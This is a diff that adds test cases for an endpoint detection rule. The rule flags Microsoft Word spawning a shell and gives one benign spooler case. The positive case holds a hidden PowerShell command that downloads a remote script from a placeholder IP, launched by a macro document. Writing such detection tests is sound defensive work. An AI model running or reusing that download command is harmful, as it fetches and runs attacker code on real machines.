@@ -1,0 +1,14 @@
+detection: endpoint/office-spawns-shell.yaml
+cases:
+  - name: Word launches PowerShell
+    expect: hit
+    tables:
+      DeviceProcessEvents:
+        - {Timestamp: -10m, DeviceId: d-004, DeviceName: wks-031, AccountName: lars.berg, FileName: powershell.exe, InitiatingProcessFileName: WINWORD.EXE, InitiatingProcessCommandLine: "\"WINWORD.EXE\" /n invoice.docm", ReportId: 3001,
+           ProcessCommandLine: "powershell.exe -w hidden -c iwr http://198.51.100.9/p.ps1"}
+  - name: Word launches the print spooler helper
+    expect: miss
+    tables:
+      DeviceProcessEvents:
+        - {Timestamp: -10m, DeviceId: d-004, DeviceName: wks-031, AccountName: lars.berg, FileName: splwow64.exe, InitiatingProcessFileName: WINWORD.EXE, ReportId: 3002,
+           ProcessCommandLine: "splwow64.exe 8192"}
